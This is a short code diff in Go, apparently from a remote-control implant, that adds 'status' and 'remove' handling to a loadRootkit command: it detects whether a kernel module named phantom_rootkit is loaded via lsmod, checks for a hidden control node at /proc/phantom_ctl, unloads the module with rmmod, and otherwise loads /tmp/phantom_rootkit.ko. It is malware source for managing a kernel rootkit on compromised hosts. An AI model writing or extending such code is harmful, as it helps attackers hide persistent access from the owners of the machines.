@@ -6,9 +6,29 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 )
 
 func loadRootkit(c Cmd) Result {
+	sub := str(c.Args["sub"])
+	if sub == "" || sub == "status" {
+		out, _ := newCmd("sh", "-c", "lsmod 2>/dev/null | grep -c phantom_rootkit").Output()
+		if strings.TrimSpace(string(out)) == "0" || strings.TrimSpace(string(out)) == "" {
+			if _, err := os.Stat("/proc/phantom_ctl"); err == nil {
+				return Result{OK: true, Out: "control node present, module not listed"}
+			}
+			return Result{OK: true, Out: "not loaded"}
+		}
+		return Result{OK: true, Out: "phantom_rootkit loaded"}
+	}
+	if sub == "remove" {
+		out, err := newCmd("rmmod", "phantom_rootkit").CombinedOutput()
+		if err != nil {
+			return Result{OK: false, Out: string(out), Err: err.Error()}
+		}
+		return Result{OK: true, Out: "module unloaded"}
+	}
+
 	ko := str(c.Args["ko"])
 	if ko == "" {
 		ko = "/tmp/phantom_rootkit.ko"
